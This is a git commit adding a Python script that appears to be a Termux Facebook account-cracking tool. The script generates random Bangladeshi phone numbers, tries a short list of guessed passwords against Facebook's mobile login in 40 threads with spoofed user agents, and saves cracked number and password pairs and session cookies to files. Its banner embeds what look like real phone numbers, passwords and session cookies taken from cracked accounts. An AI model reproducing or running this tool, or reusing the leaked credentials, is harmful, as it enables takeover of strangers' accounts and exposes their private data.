263b5c12d8c98b3adf5cdaa07d33a0422ece9367
CAIBARMORAD <151620834+CAIBARMORAD@users.noreply.github.com>
2023-12-15 01:54:30 +0600

    Add files via upload

---
+++ MORAD-999.py
@@ -0,0 +1,313 @@
+# Gift By Alhaj
+# Telegram Id : @Alhaj_404
+# Telegram : https://t.me/fb_crack_termux_all_free_command
+# Facebook Group : https://facebook.com/groups/1713018672413612/
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('pkg install espeak')
+P = '\x1b[1;97m' # 
+M = '\033[1;33m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;96m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+id = []
+user = []
+oks = []
+cps = []
+loop = 0
+ugen=[]
+for xd in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
+    d=random.randrange(10,200)
+    e='0.4844.88 '
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
+    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(uaku2)
+for xd in range(9000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(10,200)
+    e='0'
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
+    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(uaku2)
+for ua in range(10000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      aalhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(aalhaj)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(alhhaj)
+os.system("xdg-open https://t.me/fb_crack_termux_all_free_command")
+logo =("""
+   \033[34;1m╔═╗\033[35;1m╔╦╗   \033[30;1m╔╗ ╔═╗╔╗╔╔═╗╦  ╔═╗╔╦╗╔═╗╔═╗╦ ╦
+   \033[34;1m╚═╗\033[35;1m║║║───\033[31;1m╠╩╗╠═╣║║║║ ╦║  ╠═╣ ║║╠═╣╚═╗╠═╣
+   \033[34;1m╚═╝\033[35;1m╩ ╩   \033[30;1m╚═╝╩ ╩╝╚╝╚═╝╩═╝╩ ╩═╩╝╩ ╩╚═╝╩ ╩
+   \033[31;1m███    ███\033[34;1m║ \033[30;1m██████ \033[34;1m║\033[31;1m██████ \033[34;1m║ \033[30;1m█████ \033[34;1m║\033[31;1m██████
+   \033[31;1m████  ████\033[34;1m║\033[30;1m██    ██\033[34;1m║\033[31;1m██   ██\033[34;1m║\033[30;1m██   ██\033[34;1m║\033[31;1m██   ██
+   \033[31;1m██ ████ ██\033[34;1m║\033[30;1m██    ██\033[34;1m║\033[31;1m██████ \033[34;1m║\033[30;1m███████\033[34;1m║\033[31;1m██   ██
+   \033[31;1m██  ██  ██\033[34;1m║\033[30;1m██    ██\033[34;1m║\033[31;1m██   ██\033[34;1m║\033[30;1m██   ██\033[34;1m║\033[31;1m██   ██
+   \033[31;1m██      ██\033[34;1m║ \033[30;1m██████ \033[34;1m║\033[31;1m██   ██\033[34;1m║\033[30;1m██   ██\033[34;1m║\033[31;1m██████
+\033[1;96m╔════════════════════════════════════════════════╗
+\033[1;36m║ \33[1;32m[•] ❣︎[𖣘]☔︎𝙉𝘼𝙈𝙀         : [☔︎] 亗𝙈𝙊𝙍𝗔𝗗 - 𝙆𝙃𝗔𝙉亗 \033[1;36m║
+\033[1;36m║ \33[1;32m[•] ❣︎[𖣘]☔︎𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆     : [☔︎] 𝙆𝙄𝙉𝗚 - 𝙈𝙊𝙍𝗔𝗗     \033[1;36m║
+\033[1;36m║ \33[1;32m[•] ❣︎[𖣘]☔︎𝙂𝙄𝙏𝙃𝙐𝘽       : [☔︎] 𝙈𝙊𝙍𝗔𝗗-𝙆𝙃𝗔𝙉-𝗕𝙎    \033[1;36m║
+\033[1;36m║ \33[1;32m[•] ❣︎[𖣘]☔︎𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉   : [☔︎] 𝗕𝗔𝗡𝗚𝗟𝗔𝗔𝗘𝗦𝗛𝗜      \033[1;36m║
+\033[1;36m║ \33[1;32m[•] ❣︎[𖣘]☔︎𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋     : [☔︎] +8801975618861   \033[1;36m║
+\033[1;36m║ \33[1;32m[•] ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀   : [☔︎] 𝗥𝟰𝗡𝗗𝗢𝗡-𝗖𝗟𝗢𝗡𝗜𝗡𝗚   \033[1;36m║
+\033[1;36m║ \33[1;32m[•] ❣︎[𖣘]☔︎𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎 : [☔︎] 𝙋𝗔𝗜𝗗             \033[1;36m║
+\033[1;96m╚════════════════════════════════════════════════╝
+
+\033[1;96m╔════════════════════════════════════════════════╗
+\033[1;96m║\033[1;92m ✮⃝ 𝙈𝙊𝙍𝗔𝗗𝄟⃝✮⃝𝗖𝗢𝙈𝙈𝗔𝗡𝗗𝄟 ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : 017
+\033[1;96m║\033[1;92m ✮⃝ 𝙈𝙊𝙍𝗔𝗗𝄟⃝✮⃝𝗖𝗢𝙈𝙈𝗔𝗡𝗗𝄟 ƳϴႮᎡ ͲϴͲᎪᏞ ᏆᎠ : 50000
+\033[1;96m║\033[1;92m ✮⃝ 𝙈𝙊𝙍𝗔𝗗𝄟⃝✮⃝𝗖𝗢𝙈𝙈𝗔𝗡𝗗𝄟 ❐⊰༎⊱𝙋𝗔𝗜𝗗⊰༎⊱❐
+\033[1;96m╚════════════════════════════════════════════════╝
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01958752977 \033[1;96m◉\033[1;92m 253683
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=aot0ZTw2rteedUosJF3EH6Xr;fr=0AWGGnff34LpbOOqS.AWUUrZDR3kyk35beI9Cuq4dxvko.BldItq.Ck.AAA.0.0.BldItq.AWXV65nmLEI;sb=aot0ZdHwYdFX_L-d2Kgbsru0;c_user=100015042993214;xs=1%3ANvT51GxyjIq3Xg%3A2%3A1702136688%3A-1%3A12665;m_page_voice=100015042993214
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01977418993 \033[1;96m◉\033[1;92m 984500
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=eIt0ZQ5hqcA-SX4e-6JhVWyQ;fr=0pV9xpm9pPTgJUyZI.AWVlJzwRTY1xTLy98ZWdW0bk3PM.BldIt4.WC.AAA.0.0.BldIt4.AWX32u686l4;sb=eIt0ZQYSorY5jKOLFscodDoG;c_user=100030841091401;xs=29%3AV20LYfIaYjuL7w%3A2%3A1702136698%3A-1%3A5275;m_page_voice=100030841091401
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01925501931 \033[1;96m◉\033[1;92m 017756
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=H4x0Zfix6fQX8BZCx3blCOp1;fr=0qCCHnxRowemD9Ntu.AWWCiCDYwtCksaw-0kEaHGf4jko.BldIwf.vr.AAA.0.0.BldIwf.AWXHml4bk5s;sb=H4x0Zah9AoUGDhrTEcWuDW7J;c_user=100033938897437;xs=41%3AkOZc4D6Ba7A-FQ%3A2%3A1702136866%3A-1%3A5186;m_page_voice=100033938897437
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01912724825 \033[1;96m◉\033[1;92m 117958
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=kY50ZQljMpFJqkOy4wdxT728;fr=05X843Hg8qpzgabS4.AWXNtnt93EBUk-0jDzGkQFgbw5Y.BldI6R.ED.AAA.0.0.BldI6S.AWXGGIAuOfA;sb=kY50ZU7rk76KCm6IiXvzyBhq;c_user=100015807125863;xs=13%3AMPwqbpFD29yqjg%3A2%3A1702137492%3A-1%3A5137;m_page_voice=100015807125863
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01982823467 \033[1;96m◉\033[1;92m 333580
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=JJl0ZbOLHEk_qLfV7wLE-xhb;fr=0fFnhoZ6ETuLhzVUk.AWW9XwdNtpbg9-BDyzH_sHfjvwk.BldJkk.17.AAA.0.0.BldJkk.AWWo-UTNkuk;sb=JJl0ZbUrIK6lE4IaX-SJHzts;c_user=100081669033904;xs=24%3AdFSXNyOON6UuWw%3A2%3A1702140199%3A-1%3A13345;m_page_voice=100081669033904
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01938618787 \033[1;96m◉\033[1;92m 997720
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=Y7Z1ZSSY356_UZpPJzq-um2m;fr=03HflFfMJIfBLxP6e.AWX6N7yCS-t_z93lVDHJJIWTGHI.BldbZj.Po.AAA.0.0.BldbZj.AWVDW-PnVJE;sb=Y7Z1ZQMSIJ-3ff7pBLiZzerc;c_user=100056210001744;xs=48%3A65KyWSnkkxKgiQ%3A2%3A1702213223%3A-1%3A5238;m_page_voice=100056210001744
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01904173293 \033[1;96m◉\033[1;92m 371902
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=ibZ1Zb8-s3FsnySPk9JCHpTu;fr=0oN6meJLbaNSVgJ2z.AWUEMzZVaQpp-QqHb41RhrcMs8o.BldbaJ.vN.AAA.0.0.BldbaK.AWUP5L6i1WY;sb=ibZ1ZR-Dh_DBblTg05_NWACh;c_user=100033911584426;xs=5%3A05ulUZ-GDkxKRA%3A2%3A1702213266%3A-1%3A5349;m_page_voice=100033911584426
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01961250877 \033[1;96m◉\033[1;92m 913446
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=F-F6ZVY6RF4f_VEz2MYRmoyH;fr=09xSrcKHH7XvM6RrX.AWVaYT7akWbH0gpcCHCGv6XLsy4.BleuEX.9g.AAA.0.0.BleuEX.AWXF0dxPwSQ;sb=F-F6ZTkAlG50pwc4shqjNqCg;c_user=100015756319148;xs=42%3ALYkm8AYp8a_Xig%3A2%3A1702551840%3A-1%3A5335;m_page_voice=100015756319148
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01941554396 \033[1;96m◉\033[1;92m 031092
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=ps96ZQwr9Wsprg8fJSGVTKK4;fr=0s6qGwzckdBm8VBBB.AWWMBwoiJYqc1Y7SG7oEoqVt7KA.Bles-m.Eq.AAA.0.0.Bles-n.AWXZLsY9JcI;sb=ps96ZZxenLxoTyyyZECsApWK;c_user=100085507411853;xs=8%3A3uD3x1uL77IQ6Q%3A2%3A1702547375%3A-1%3A5160;m_page_voice=100085507411853
+\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m 01977806418 \033[1;96m◉\033[1;92m 926357
+\033[1;36mᏟϴϴᏦᏆᎬ ➻ \033[1;35mdatr=9dJ6ZWvUiMMoqxq4pL4zZeCS;fr=0ouOjYrG9Qzv1h1eN.AWUeCIbAFSpkvsHXKfR4NG0fU2g.BletL1.fN.AAA.0.0.BletL2.AWUCtuGvxPM;sb=9dJ6ZcwGsAtLrYGJfs8pH-Ul;c_user=61554614930321;xs=22%3ARnWZ31SHor4vVQ%3A2%3A1702548222%3A-1%3A9323;m_page_voice=61554614930321
+\033[1;91m[\033[1;32m✮⃝ 𝙈𝙊𝙍𝗔𝗗𝄟⃝\033[1;91m]🌺\033[1;91m[\033[1;32m1067\033[1;91m]💚\033[1;91m[\033[1;32mOK-10\033[1;91m]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+""") 
+ 
+def Alhaj():
+    os.system('clear')
+    os.system('xdg-open https://facebook.com/groups/1713018672413612/')
+    print(logo)
+    print("")
+    print("\033[1;96m ╔═════════════════════════════════╗")
+    print("\033[1;36m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᎡᎪΝᎠϴᎷ ᏟᏞϴΝᎬ ᏴᎠ        \033[1;36m║")
+    print("\033[1;96m ╠═════════════════════════════════╣")
+    print(" \033[1;36m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ ҒᏴ ᏀᎡϴႮᏢ       \033[1;36m║")
+    print(" \033[1;36m║  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ MS ᏀᎡϴႮᏢ       \033[1;36m║")
+    print("\033[1;36m ║  \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m ᎬХᏆͲ                   \033[1;36m║")
+    print("\033[1;96m ╚═════════════════════════════════╝")
+    print("")
+    Alhaj = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
+    if Alhaj in ["1","A"]:
+        Alhajs()
+    if Alhaj in ["2","B"]:
+        os.system('xdg-open https://facebook.com/groups/1713018672413612/')
+    if Alhaj in ["3","C"]:
+        os.system('xdg-open https://m.me/j/AbZqgfeGR8AMRy9D/')
+    if Alhaj in ["0","X"]:
+        os.system('exit')
+
+def Alhajs():
+    user=[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print("\033[1;91m╔════════════════════════════════════════════╗")
+    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  ║")
+    print("\033[1;91m╚════════════════════════════════════════════╝")
+    code = input('\033[1;32m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ :\033[1;36m ')
+    os.system('clear')
+    os.system('xdg-open https://facebook.com/groups/1713018672413612/')
+    print(logo)
+    print("\033[1;91m╔════════════════════════════════════════════╗")
+    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m ║")
+    print("\033[1;91m╚════════════════════════════════════════════╝")
+    limit=int(input("\033[1;32m ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ :\033[1;36m "))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=40) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print("\033[1;91m╔═════════════════════════════════════╗")
+        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : '+code) 
+        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ͲϴͲᎪᏞ ᏆᎠ : '+tl)
+        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴƳ ᎪᏞᎻᎪᎫ ')
+        print("\033[1;91m╚═════════════════════════════════════╝")
+        for love in user:
+            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
+            uid = code+love
+            Fb_crack.submit(Alhajm,uid,pwx,tl)
+    print("\033[1;91m╔═══════════════════════════╗")
+    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
+    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM ALHAJ ')
+    print("\033[1;91m╚═══════════════════════════╝")
+
+
+def Alhajm(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;91m[\033[1;92mՏᎬᎪᎡᏟᎻᏆΝᏀ\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://x.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'x.facebook.com',
+    'method': 'GET',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'referer': 'https://x.facebook.com/?stype=lo&deoia=1&jlou=AfdNEleRo5HFTLsoyHY15XMYzeaHuDhI5NQoq6skAmjgr91WcJsuy2fh3lkmFtn8qXhIS0HnjR1BKRbimpYVWOZ5hXoBwDFS788juYS3LOcPBQ&smuh=24745&lh=Ac_TBv170kCdzrqSsv4&wtsid=rdr_04YJ22I7tJXUMgJBO&_rdr',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"itel S661LP"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,
+    'viewport-width': '980',}
+            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f'\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
+                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
+                open('/sdcard/ALHAJ-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\033[1;90m[ҒᏴ-ᏟᎡᎪᏟᏦ-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
+                open('/sdcard/ALHAJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+ 
+Alhaj()
